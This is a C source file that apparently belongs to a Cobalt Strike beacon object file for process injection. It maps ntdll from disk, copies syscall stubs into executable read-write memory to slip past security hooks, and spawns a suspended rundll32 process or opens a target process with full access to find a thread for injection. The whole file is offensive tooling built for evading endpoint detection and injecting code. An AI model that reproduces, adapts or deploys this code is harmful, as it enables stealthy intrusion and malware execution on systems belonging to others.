#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"
#include "bofdefs.h"

#ifdef _WIN64
#define SPAWNTO_ARCH_x86 FALSE
#define SPAWNTO_COMMANDLINE "C:\\Windows\\System32\\rundll32.exe"
#else
#define SPAWNTO_ARCH_x86 TRUE
#define SPAWNTO_COMMANDLINE "C:\\Windows\\System32\\rundll32.exe"
#endif



#define MAX_PATH_LENGTH 1000
#define SYSCALL_STUB_X86_SIZE 18


typedef struct _HMOD {
    HANDLE hMapViewOfFile;
    HANDLE hFileMapping;
    HANDLE hFile;
} HMOD, *PHMOD;

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )


DWORD _rva2ofs(PIMAGE_NT_HEADERS lpNtHeaders, DWORD dwRVA)
{
    PIMAGE_SECTION_HEADER lpSectionHeader = NULL;
    WORD i = 0;
    DWORD dwOffset = (DWORD)-1;
    
    if(dwRVA == 0) { goto end; }
    
    lpSectionHeader = IMAGE_FIRST_SECTION(lpNtHeaders);
    
    // Loop through all sections looking for the RVA
    for(i = (lpNtHeaders->FileHeader.NumberOfSections-1); (SHORT)i >= 0; i--)
    {
        if ( (lpSectionHeader[i].VirtualAddress <= dwRVA) && (dwRVA <= (DWORD)lpSectionHeader[i].VirtualAddress + lpSectionHeader[i].SizeOfRawData) )
        {
            dwOffset = (lpSectionHeader[i].PointerToRawData + dwRVA - lpSectionHeader[i].VirtualAddress);
            break;
        }
    }

end:

    return dwOffset;
}


LPVOID _GetProcAddress(PHMOD phMod, LPCSTR lpProcName)
{
    LPBYTE lpBaseAddress = NULL;
    PIMAGE_DOS_HEADER lpDosHeader = NULL;
    PIMAGE_NT_HEADERS lpNtHeaders = NULL;
    PIMAGE_DATA_DIRECTORY lpDataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY lpExportDirectory = NULL;
    DWORD dwRVA = 0;
    DWORD dwOffset = 0;
    DWORD dwCount = 0;
    PCHAR szString = NULL;
    PDWORD lpdwAddress = NULL;
    PDWORD lpdwSymbol = NULL;
    PWORD lpwOrdinal = NULL;
    LPVOID lpProcAddress = NULL;
    
    // Check arguments
    if ( (NULL == phMod)||(NULL == lpProcName) ) { goto end; }
    if (NULL == phMod->hMapViewOfFile) { goto end; }

    // Navigate through the headers
    lpBaseAddress = (LPBYTE)phMod->hMapViewOfFile;
    lpDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
    lpNtHeaders = (PIMAGE_NT_HEADERS)(lpBaseAddress + lpDosHeader->e_lfanew);
    lpDataDirectory = (PIMAGE_DATA_DIRECTORY)lpNtHeaders->OptionalHeader.DataDirectory;
    
    // Check for RVA to directories
    dwRVA = lpDataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if(dwRVA == 0) { goto end; }
    
    // Get the offset to the directories
    dwOffset = _rva2ofs(lpNtHeaders, dwRVA);
    if(-1 == dwOffset) { goto end; }
    
    // Get the export table
    lpExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddress + dwOffset);

    // Check the number of export names
    dwCount = lpExportDirectory->NumberOfNames;
    if(0 == dwCount) { goto end; }
    
    // Get the offset to the list of export symbol names
    dwOffset = _rva2ofs(lpNtHeaders, lpExportDirectory->AddressOfNames);        
    if(-1 == dwOffset) { goto end; }

    // Get the list of export symbol names
    lpdwSymbol = (PDWORD)(lpBaseAddress + dwOffset);

    // Get the offset to the list of export function addresses
    dwOffset = _rva2ofs(lpNtHeaders, lpExportDirectory->AddressOfFunctions);        
    if(-1 == dwOffset) { goto end; }

    // Get the list of export function addresses
    lpdwAddress = (PDWORD)(lpBaseAddress + dwOffset);
    
    // Get the offset to the list of export ordinals
    dwOffset = _rva2ofs(lpNtHeaders, lpExportDirectory->AddressOfNameOrdinals);
    if(-1 == dwOffset) { goto end; }

    // Get the list of export ordinals
    lpwOrdinal = (PWORD)(lpBaseAddress + dwOffset);
    
    // Loop through the exports and find our function
    do
    {
        // Get the offset to the current symbol name
        dwOffset = _rva2ofs(lpNtHeaders, lpdwSymbol[dwCount - 1]);
        if(-1 == dwOffset) { continue; }

        // Get the current export symbol name
        szString = (PCHAR)(lpBaseAddress + dwOffset);

        // Check if the current symbol name matches our function name
        if(0 == KERNEL32$lstrcmpA(szString, lpProcName))
        {
            // Get the offset to the export function address
            dwOffset = _rva2ofs(lpNtHeaders, lpdwAddress[lpwOrdinal[dwCount - 1]]);
            if(-1 == dwOffset) { goto end; }

            // Get the current export function address
            lpProcAddress = (LPVOID)(lpBaseAddress + dwOffset);
            break;
        }
    } while (--dwCount);

end:

    return lpProcAddress;
}


PHMOD _LoadLibrary(LPCSTR lpLibFileName)
{
    PHMOD phMod = NULL;
    CHAR szFullPathName[MAX_PATH];
    HANDLE hMapViewOfFile = NULL;
    HANDLE hFileMapping = NULL;
    HANDLE hFile = NULL;

    intZeroMemory(szFullPathName, MAX_PATH);

    // Get the full path of NTDLL
    if ( 0 == KERNEL32$ExpandEnvironmentStringsA(lpLibFileName, szFullPathName, MAX_PATH) ) { goto end; }

    // Open NTDLL file on disk
    hFile = KERNEL32$CreateFileA(
        (LPCSTR)szFullPathName, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL
    );
    if (INVALID_HANDLE_VALUE == hFile) { goto end; }
    
    // Create file mapping from file on disk
    hFileMapping = KERNEL32$CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (NULL == hFileMapping) { goto end; }
    
    // Create map view of file on disk
    hMapViewOfFile = KERNEL32$MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (NULL == hMapViewOfFile) { goto end; }

    phMod = (PHMOD)intAlloc(sizeof(HMOD));
    if (NULL == phMod) { goto end; }

    phMod->hMapViewOfFile =hMapViewOfFile;
    hMapViewOfFile = NULL;
    phMod->hFileMapping =hFileMapping;
    hFileMapping = NULL;
    phMod->hFile =hFile;
    hFile = NULL;

end:

    if (hMapViewOfFile) 
    {
        KERNEL32$UnmapViewOfFile(hMapViewOfFile);
        hMapViewOfFile = NULL;
    }

    if (hFileMapping)
    {
        KERNEL32$CloseHandle(hFileMapping);
        hFileMapping = NULL;
    }

    if (hFile)
    {
        KERNEL32$CloseHandle(hFile);
        hFile = NULL;
    }

    return phMod;
}


void _FreeLibrary(PHMOD phMod)
{
    if (NULL == phMod) { goto end; }

    if (phMod->hMapViewOfFile) 
    {
        KERNEL32$UnmapViewOfFile(phMod->hMapViewOfFile);
        phMod->hMapViewOfFile = NULL;
    }

    if (phMod->hFileMapping)
    {
        KERNEL32$CloseHandle(phMod->hFileMapping);
        phMod->hFileMapping = NULL;
    }

    if (phMod->hFile)
    {
        KERNEL32$CloseHandle(phMod->hFile);
        phMod->hFile = NULL;
    }

    intFree(phMod);

end:
    return;
}


LPVOID GetSyscallStub(PHMOD phMod, LPCSTR lpSyscallName)
{
    LPVOID lpCodeStub = NULL;
    LPBYTE lpBaseAddress = NULL;
    PIMAGE_DOS_HEADER lpDosHeader = NULL;
    PIMAGE_NT_HEADERS lpNtHeaders = NULL;
    PIMAGE_DATA_DIRECTORY lpDataDirectory = NULL;
    PIMAGE_RUNTIME_FUNCTION_ENTRY lpRuntimeFunction = NULL;
    DWORD dwOffset = 0;
    LPBYTE lpBeginAddress = 0;
    LPBYTE lpEndAddress = 0;
    LPBYTE lpProcAddress = 0;
    SIZE_T dwLength = 0;
    DWORD i = 0;
    DWORD dwRVA = 0;
 
    // Custom GetProcAddress on function
    lpProcAddress = (LPBYTE)_GetProcAddress(phMod, lpSyscallName);
    if(NULL == lpProcAddress) { goto end; }

#ifdef _WIN64
    // Parse headers of loaded library
    lpBaseAddress = phMod->hMapViewOfFile;
    lpDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;
    lpNtHeaders  = (PIMAGE_NT_HEADERS)((PBYTE)lpBaseAddress + lpDosHeader->e_lfanew);
    lpDataDirectory = (PIMAGE_DATA_DIRECTORY)lpNtHeaders->OptionalHeader.DataDirectory;
    
    // Get the offset to the exception directory
    dwRVA = lpDataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    if(dwRVA == 0) { goto end; }
    dwOffset = _rva2ofs(lpNtHeaders, dwRVA);
    if(-1 == dwOffset) { goto end; }

    // Get the address of the runtime function entry    
    lpRuntimeFunction = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(lpBaseAddress + dwOffset);

    // Loop through runtime functions
    for(i=0; lpRuntimeFunction[i].BeginAddress != 0; i++)
    {
        // Calculate the begin address of the current runtime function
        dwOffset = _rva2ofs(lpNtHeaders, lpRuntimeFunction[i].BeginAddress);
        lpBeginAddress = lpBaseAddress + dwOffset;

        // Check if the current runtime function corresponds to our function
        if(lpBeginAddress == lpProcAddress)
        {
            // Calculate the end address of the current function
            dwOffset = _rva2ofs(lpNtHeaders, lpRuntimeFunction[i].EndAddress);
            lpEndAddress = lpBaseAddress + dwOffset;

            // Calculate the length of the function
            dwLength = (SIZE_T)(lpEndAddress - lpBeginAddress);

            // Allocate a buffer for our local copy of the syscall stub
            lpCodeStub = KERNEL32$VirtualAlloc(NULL, dwLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (NULL == lpCodeStub) { goto end; }

            // Copy the syscall stub
            memcpy(lpCodeStub, (const void*)lpBeginAddress, dwLength);
            break;
        }
    }
#else
    dwLength = SYSCALL_STUB_X86_SIZE;

    // Allocate a buffer for our local copy of the syscall stub
    lpCodeStub = KERNEL32$VirtualAlloc(NULL, dwLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (NULL == lpCodeStub) { goto end; }

    // Copy the syscall stub
    memcpy(lpCodeStub, (const void*)lpProcAddress, dwLength);
#endif
    
end:
    
    // return pointer to code stub or NULL
    return lpCodeStub;
}


DWORD GetInjectionHandle(DWORD dwPid, PROCESS_INFORMATION* lpProcessInfo)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    STARTUPINFO startupInfo;
    DWORD dwThreadId = 0;
    char szTemporaryProcessName[MAX_PATH_LENGTH];
    
    intZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    intZeroMemory(lpProcessInfo, sizeof(PROCESS_INFORMATION));
    intZeroMemory(szTemporaryProcessName, sizeof(STARTUPINFO));

    if (0 == dwPid)
    {
        // Create the temporary process suspended
#ifdef BOF
        BeaconGetSpawnTo(SPAWNTO_ARCH_x86, szTemporaryProcessName, MAX_PATH_LENGTH);
        internal_printf("Spawning Temporary Process (%s)...\n", szTemporaryProcessName);
        if ( FALSE == BeaconSpawnTemporaryProcess( SPAWNTO_ARCH_x86, TRUE, &startupInfo, lpProcessInfo ) )
        {
            dwErrorCode = ERROR_PROCESS_ABORTED;
            internal_printf("BeaconSpawnTemporaryProcess failed (%lu)\n", dwErrorCode);
            goto end;
        }
#else
        strcpy(szTemporaryProcessName, SPAWNTO_COMMANDLINE);
        internal_printf("Spawning Temporary Process (%s)...\n", szTemporaryProcessName);
        if ( FALSE == KERNEL32$CreateProcessA(
            szTemporaryProcessName, 
            NULL, 
            NULL, 
            NULL, 
            FALSE, 
            CREATE_SUSPENDED|CREATE_NO_WINDOW, 
            NULL, 
            NULL, 
            &startupInfo, 
            lpProcessInfo
            )
        )
        {
            dwErrorCode = KERNEL32$GetLastError();
            internal_printf("CreateProcessA failed (%lu)\n", dwErrorCode);
            goto end;
        }
#endif        
    }
    else
    {
        internal_printf("Opening Existing Process...\n");

        // Get the injection process handle
        lpProcessInfo->hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
        if ( NULL == (lpProcessInfo->hProcess) )
        {
            dwErrorCode = KERNEL32$GetLastError();
            internal_printf("OpenProcess failed (%lu)\n", dwErrorCode);
            goto end;
        }

        // Set the injection process ID
        lpProcessInfo->dwProcessId = dwPid;

        // Find a thread ID in the process
        for(dwThreadId = 0; dwThreadId < USHRT_MAX; dwThreadId += 4)
        {
            HANDLE hThread = KERNEL32$OpenThread( THREAD_ALL_ACCESS, FALSE, dwThreadId );
            if (hThread)
            {
                if( KERNEL32$GetProcessIdOfThread(hThread) == dwPid )
                {
                    // Set the injection thread handle
                    lpProcessInfo->hThread = hThread;
                    hThread = NULL;
                    // Set the injection thread ID
                    lpProcessInfo->dwThreadId = dwThreadId;
                    break;
                }
                KERNEL32$CloseHandle(hThread);
                hThread = NULL;
            }
        }
    }

    //internal_printf("dwProcessId: %lu\n", lpProcessInfo->dwProcessId);
    //internal_printf("dwThreadId:  %lu\n", lpProcessInfo->dwThreadId);
    //internal_printf("hProcess:    %p\n", lpProcessInfo->hProcess);
    //internal_printf("hThread:     %p\n", lpProcessInfo->hThread);

end:    

    return dwErrorCode;
}

void CloseInjectionHandle(PROCESS_INFORMATION* lpProcessInfo)
{
#ifdef BOF
    BeaconCleanupProcess(lpProcessInfo);
#else
    if ( lpProcessInfo->hProcess )
    {
        KERNEL32$CloseHandle(lpProcessInfo->hProcess);
    }
    if ( lpProcessInfo->hThread )
    {
        KERNEL32$CloseHandle(lpProcessInfo->hThread);
    }
    MSVCRT$memset(lpProcessInfo, 0, sizeof(PROCESS_INFORMATION));
#endif
}

#ifndef BOF
DWORD ReadFileIntoBuffer(LPCSTR szFileName, LPBYTE* lppBuffer, LPDWORD lpdwBufferSize )
{
    DWORD dwErrorCode = ERROR_SUCCESS;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	LPBYTE pBuffer = NULL;
	DWORD dwSize = 0;
	DWORD dwBytesRead = 0;

	*lppBuffer = NULL;
	if (NULL != lpdwBufferSize)
	{
		*lpdwBufferSize = 0;
	}


    hFile = KERNEL32$CreateFileA(
        szFileName,
        GENERIC_READ,
        FILE_SHARE_READ,
        0,
        OPEN_EXISTING,
        0,
        0
    );
    if (INVALID_HANDLE_VALUE == hFile)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("CreateFileA failed (%lu)\n", dwErrorCode);
        goto end;
    }
			
    dwSize = KERNEL32$GetFileSize(hFile, NULL);
    if ((INVALID_FILE_SIZE == dwSize)||(0 == dwSize))
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("GetFileSize failed (%lu)\n", dwErrorCode);
        goto end;
    }

    pBuffer = (PBYTE)intAlloc(dwSize);
    if (NULL == pBuffer)
    {
        dwErrorCode = ERROR_OUTOFMEMORY;
        internal_printf("intAlloc failed (%lu)\n", dwErrorCode);
        goto end;
    }
			
    if (FALSE == KERNEL32$ReadFile(
            hFile,
            pBuffer,
            dwSize,
            &dwBytesRead,
            0
        )
    )
    {
		dwErrorCode = KERNEL32$GetLastError();
        internal_printf("ReadFile failed (%lu)\n", dwErrorCode);
        goto end;
    }

    if (dwBytesRead != dwSize)
    {
        dwErrorCode = ERROR_HANDLE_EOF;
        internal_printf("ReadFile failed (%lu != %lu)\n", dwBytesRead, dwSize);
        goto end;
    }

    *lppBuffer = pBuffer;

    if (NULL != lpdwBufferSize)
    {
        *lpdwBufferSize = dwSize;
    }

end:
		
    if ((ERROR_SUCCESS != dwErrorCode) && (NULL != pBuffer))
    {
        intFree(pBuffer);
        pBuffer = NULL;
    }

			
    if ((INVALID_HANDLE_VALUE != hFile) && (NULL != hFile))
    {
        KERNEL32$CloseHandle(hFile);
        hFile = NULL;
    }

	return dwErrorCode;
}
#endif